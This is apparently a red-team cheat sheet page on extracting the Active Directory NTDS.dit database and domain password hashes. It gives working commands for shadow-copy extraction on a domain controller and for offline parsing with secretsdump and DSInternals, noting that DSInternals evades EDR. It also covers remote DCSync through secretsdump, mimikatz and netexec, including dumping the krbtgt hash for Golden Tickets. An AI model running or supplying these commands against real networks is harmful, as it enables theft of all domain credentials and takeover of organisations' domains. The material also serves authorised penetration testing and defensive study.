---
title: "NTDS.DIT"
---

# 🔓 NTDS.dit

## 📚 Resources

- [ired.team](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration)
- [TheHackerRecipes](https://www.thehacker.recipes/ad/movement/credentials/dumping/ntds)

## What is NTDS.dit

NTDS.dit is the Active Directory database. It contains all domain credentials (password hashes for all domain users), Kerberos keys, and AD objects.

## Local extraction (on the DC)

> _The shadow copy number (`...ShadowCopy1`) returned by `vssadmin` is incremental and may differ - check with `vssadmin list shadows`._

::: code-group

```cmd [vssadmin]
# Create shadow copy of C:
vssadmin create shadow /for=C:

# Copy NTDS.dit + registry hives from the shadow (adjust the ShadowCopyN number)
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit    C:\Windows\Temp\NTDS.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM   C:\Windows\Temp\SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY C:\Windows\Temp\SECURITY
```

```powershell [UnderlayCopy]
# Import module and copy NTDS.dit without locking
Import-Module .\UnderlayCopy.ps1
Underlay-Copy -Mode MFT -SourceFile C:\Windows\NTDS\ntds.dit -DestinationFile C:\Temp\ntds.dit
```

```cmd [diskshadow]
# Create a script for diskshadow
echo set context persistent nowriters > script.txt
echo add volume c: alias ntdsShadow >> script.txt
echo create >> script.txt
echo expose %ntdsShadow% x: >> script.txt
echo exit >> script.txt

# Execute diskshadow
diskshadow /s script.txt

# Copy the files
xcopy x:\Windows\NTDS\ntds.dit C:\NTDS\
xcopy x:\Windows\System32\config\SYSTEM C:\
```

:::

## Parse hashes from collected files (offline)

::: code-group

```bash [secretsdump]
secretsdump -ntds ntds.dit -system system LOCAL
```

```powershell [DSInternals]
# PowerShell offline parser, often bypasses signature-based EDR
$key = Get-BootKey -SystemHiveFilePath .\SYSTEM
Get-ADDBAccount -All -DBPath .\ntds.dit -BootKey $key
```

:::

## 🎯 Remote extraction (preferred for red team)

> _Requires DA or any user with the `DS-Replication-Get-Changes-All` right (e.g. Exchange, printer accounts, misconfigured ACLs)._

::: code-group

```bash [secretsdump]
# DCSync via DRSUAPI - NTLM hashes only
secretsdump -just-dc-ntlm $DOMAIN/$USER:$PASSWORD@$DC

# Full dump (hashes + Kerberos keys + cleartext from SECURITY)
secretsdump $DOMAIN/$USER:$PASSWORD@$DC

# Target a single account (e.g. krbtgt for a Golden Ticket)
secretsdump -just-dc-user krbtgt $DOMAIN/$USER:$PASSWORD@$DC
```

```powershell [mimikatz]
# DCSync from a Windows admin box - no file touch on the DC
mimikatz # lsadump::dcsync /domain:$DOMAIN /user:krbtgt
```

```bash [netexec]
nxc smb $DC -u $USER -p $PASSWORD -M ntdsutil     # drops ntds.dit + SYSTEM via ntdsutil IFM
nxc smb $DC -u $USER -p $PASSWORD -M vss          # drops files via vssadmin shadow copy
```

:::
